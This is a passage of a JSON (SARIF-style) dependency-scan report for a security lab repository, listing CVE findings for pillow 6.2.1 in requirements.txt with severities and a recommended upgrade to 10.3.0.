          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2019-19911",
          "ruleIndex": 12,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2019-19911 (severity: high, fixed in 6.2.2)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2019-19911](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19911)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ab4ff89dd58a6bf1704b677195cd90173ea0cfc8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-5313",
          "ruleIndex": 13,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-5313 (severity: high, fixed in 6.2.2)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-5313](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5313)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5f0cb71ca0b2c09b4f16b7f182f6c1a4347faf8e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-5312",
          "ruleIndex": 14,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-5312 (severity: critical, fixed in 6.2.2)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-5312](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5312)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f0c5541c40e93af27a84071ea1cfe74fc0aa56b2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-5310",
          "ruleIndex": 15,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-5310 (severity: critical, fixed in 6.2.2)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-5310](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5310)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2786d8d13d38d1b5863a36398ef08df5ce5ea0be"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-11538",
          "ruleIndex": 16,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-11538 (severity: critical, fixed in 7.1.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-11538](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11538)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a5d778f037d4f0fd374826224657099cdca328a1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-10994",
          "ruleIndex": 17,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-10994 (severity: high, fixed in 7.1.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-10994](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10994)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c952afac4739f8e5258659ddd5f11e3c8ff0800e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-10378",
          "ruleIndex": 18,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-10378 (severity: high, fixed in 7.1.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-10378](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10378)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "221472162275c34d9ef8c8d4a422d094238cbe48"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-10177",
          "ruleIndex": 19,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-10177 (severity: high, fixed in 7.1.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-10177](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10177)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7b246f424746055b545c3ee848f1c7bc4a688a2e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-10379",
          "ruleIndex": 20,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-10379 (severity: high, fixed in 7.1.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-10379](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10379)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3ef278e1797159932e60d5bf8784bc774dd269dc"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-35655",
          "ruleIndex": 21,
          "level": "warning",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-35655 (severity: medium, fixed in 8.1.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-35655](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35655)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ea263bac6ae1afa3a5ea5ad06de4c1aad42358bd"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-35653",
          "ruleIndex": 22,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-35653 (severity: high, fixed in 8.1.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-35653](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35653)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "598bfaae9dcf817c149eb8a4d7cea5adf9c170fd"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-35654",
          "ruleIndex": 23,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2020-35654 (severity: high, fixed in 8.1.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-35654](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35654)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fcee62cf2f0a9dcd747c5ee082bd2bd002b14f4f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-25289",
          "ruleIndex": 24,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-25289 (severity: critical, fixed in 8.1.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-25289](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25289)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "29e54f3bc779e9304e1f803c0083640d7a5c3ec6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-27921",
          "ruleIndex": 25,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-27921 (severity: high, fixed in 8.1.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-27921](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27921)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "095e6beeb42af4e440148f9e753781507128dbb5"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-25293",
          "ruleIndex": 26,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-25293 (severity: high, fixed in 8.1.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-25293](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25293)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "89829497d270475cf91967e178b9364086f1712c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-25290",
          "ruleIndex": 27,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-25290 (severity: high, fixed in 8.1.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-25290](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25290)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e133f8219dad2b5f05e86ac48922897fec12ac96"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "GHSA-jgpv-4h4c-xhw3",
          "ruleIndex": 28,
          "level": "warning",
          "message": {
